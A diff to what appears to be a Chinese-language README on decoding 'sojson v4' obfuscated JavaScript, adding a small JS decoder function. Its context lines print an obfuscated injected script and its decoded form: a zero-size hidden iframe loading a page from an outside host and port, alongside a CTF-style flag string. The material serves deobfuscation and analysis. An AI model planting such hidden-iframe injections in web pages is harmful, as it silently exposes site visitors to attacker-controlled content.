@@ -88,3 +88,20 @@ var controller = $('#search ul.tab').attr('dstype');
 >>> print '''windows["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]['\x77\x72\x69\x74\x65']('\x3c\x69\x66\x72\x61\x6d\x65 \x73\x72\x63\x3d\x22\x68\x74\x74\x70\x3a\x2f\x2f\x77\x77\x77\x2e\x63\x72\x63\x37\x30\x32\x2e\x63\x6f\x6d\x3a\x36\x38\x39\x39\x2f\x22 \x62\x6f\x72\x64\x65\x72\x3d\x22\x31\x22 \x66\x72\x61\x6d\x65\x62\x6f\x72\x64\x65\x72\x3d\x22\x31\x22 \x77\x69\x64\x74\x68\x3d\x22\x30\x22 \x68\x65\x69\x67\x68\x74\x3d\x22\x30\x22\x3e\x3c\x2f\x69\x66\x72\x61\x6d\x65\x3e');var _rbJaSzj2="\x54\x68\x69\x73\x5f\x69\x73\x5f\x61\x5f\x66\x6c\x61\x67"}'''
 windows["document"]['write']('<iframe src="http://www.crc702.com:6899/" border="1" frameborder="1" width="0" height="0"></iframe>');var _rbJaSzj2="This_is_a_flag"}
 ```
+
+### 合并了一个js版本的脚本
+可以实现解密，可能需要修改一下，以适应使用。[sv4.js](https://github.com/jinqiy/sojson.v4-decode/blob/master/sv4.js)
+``` javascript
+function decsojson4(jsf) {
+    var head="['sojson.v4']"
+    if(jsf.indexOf(head)==-1){return "Failed!\nGiven code is not encoded as Sojson v4."}
+    args=jsf.substring(240,jsf.length-58).split(/[a-zA-Z]{1,}/)
+    var str="";
+    for(var i=0;i<args.length;i++){
+        str+=String.fromCharCode(args[i])
+    }
+    return str
+}
+```
+
+
